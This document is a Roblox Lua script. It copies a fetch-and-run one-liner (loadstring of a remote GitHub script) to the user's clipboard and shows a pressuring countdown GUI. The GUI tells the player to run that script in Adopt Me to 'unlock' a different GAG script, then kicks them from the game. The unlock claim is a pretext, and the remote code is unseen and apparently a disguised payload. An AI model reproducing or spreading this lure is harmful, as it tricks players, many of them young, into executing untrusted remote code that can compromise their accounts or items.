-- Ultra-Polished Notification with 20s Countdown & Kick
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- New clipboard string
local clipboardString = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/ADMMOPSPAWN.lua"))()'

-- Clipboard setup
if setclipboard then
    setclipboard(clipboardString)
end

-- Player and GUI setup
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "ModernUnlockNotification"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 999
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 0, 0, 0)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.BackgroundTransparency = 0.15
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui

-- Styling
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(255, 50, 50)
stroke.Thickness = 1.5
stroke.Transparency = 0.3

local gradient = Instance.new("UIGradient", frame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 0))
})
gradient.Rotation = 90
gradient.Transparency = NumberSequence.new(0.7)

-- Warning Text
local warning = Instance.new("TextLabel", frame)
warning.Size = UDim2.new(0.9, 0, 0.6, 0)
warning.Position = UDim2.new(0.05, 0, 0.05, 0)
warning.Text = "⛔️ TO UNLOCK GAG SCRIPT! [Execute My Adopt Me Script First]"
warning.TextColor3 = Color3.fromRGB(255, 255, 255)
warning.TextTransparency = 0.1
warning.BackgroundTransparency = 1
warning.Font = Enum.Font.FredokaOne
warning.TextSize = 20
warning.TextWrapped = true
warning.TextXAlignment = Enum.TextXAlignment.Center
warning.TextYAlignment = Enum.TextYAlignment.Top
warning.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
warning.TextStrokeTransparency = 0.8

-- Sub Text
local subText = Instance.new("TextLabel", frame)
subText.Size = UDim2.new(0.9, 0, 0.2, 0)
subText.Position = UDim2.new(0.05, 0, 0.5, 0)
subText.Text = "Script copied to your clipboard!"
subText.TextColor3 = Color3.fromRGB(200, 200, 200)
subText.BackgroundTransparency = 1
subText.Font = Enum.Font.FredokaOne
subText.TextSize = 16
subText.TextWrapped = true
subText.TextXAlignment = Enum.TextXAlignment.Center

-- Countdown Label
local countdown = Instance.new("TextLabel", frame)
countdown.Size = UDim2.new(0.9, 0, 0.2, 0)
countdown.Position = UDim2.new(0.05, 0, 0.75, 0)
countdown.Text = "Kicking in: 20"
countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
countdown.BackgroundTransparency = 1
countdown.Font = Enum.Font.FredokaOne
countdown.TextSize = 22
countdown.TextXAlignment = Enum.TextXAlignment.Center

-- Progress Bar
local progressBar = Instance.new("Frame", frame)
progressBar.Size = UDim2.new(0.9, 0, 0.02, 0)
progressBar.Position = UDim2.new(0.05, 0, 0.95, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
progressBar.BackgroundTransparency = 0.5
progressBar.BorderSizePixel = 0

local progressFill = Instance.new("Frame", progressBar)
progressFill.Size = UDim2.new(1, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
progressFill.BackgroundTransparency = 0.3
progressFill.BorderSizePixel = 0

-- Open Animation
TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {
    Size = UDim2.new(0.6, 0, 0.35, 0),
    BackgroundTransparency = 0.1
}):Play()

-- Countdown
local duration = 20
local messageChanged = false

task.spawn(function()
    for i = duration, 0, -1 do
        countdown.Text = "Kicking in: " .. i
        progressFill.Size = UDim2.new(i / duration, 0, 1, 0)

        -- Mid-countdown message change at 10s
        if i == 10 and not messageChanged then
            messageChanged = true
            warning.Text = "⚠️ Join Adopt Me And Execute The Script! TO UNLOCK GAG SCRIPT ⚠️"
            subText.Text = "Script is ready in your clipboard!"
            TweenService:Create(warning, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {
                TextTransparency = 0,
                TextSize = 22
            }):Play()
        end

        -- Pulsing effect for last 5 seconds
        if i <= 5 then
            local pulse = math.abs(math.sin(i * 10)) * 0.2
            countdown.TextTransparency = pulse
        else
            countdown.TextTransparency = 0
        end

        task.wait(1)
    end

    -- Final Kick
    countdown.Text = "KICKING…."
    task.wait(0.5)
    gui:Destroy()
    player:Kick("Adopt Me Script Copied On Your Clipboard!")
end)

-- Click-to-copy again
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        if setclipboard then
            setclipboard(clipboardString)
            subText.Text = "✅ COPIED AGAIN!"
            subText.TextColor3 = Color3.fromRGB(50, 255, 50)
            task.wait(1)
            subText.Text = "Check your clipboard for the script!"
            subText.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
    end
end)
